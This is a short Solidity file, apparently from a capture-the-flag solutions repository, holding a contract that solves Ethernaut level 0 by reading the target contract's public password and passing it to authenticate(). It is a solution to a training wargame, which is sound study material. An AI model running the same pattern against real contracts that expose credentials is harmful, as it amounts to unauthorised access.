// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IInstance.sol";

/**
 * @title Instance Attack (Ethernaut Challenge Level 0 - Hello Ethernaut)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 0
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966
 * @custom:security-contact emretepedev@gmail.com
 */
contract InstanceAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IInstance target) external {
        target.authenticate(target.password());

        require(target.getCleared(), "Instance: Attack failed");
    }
}
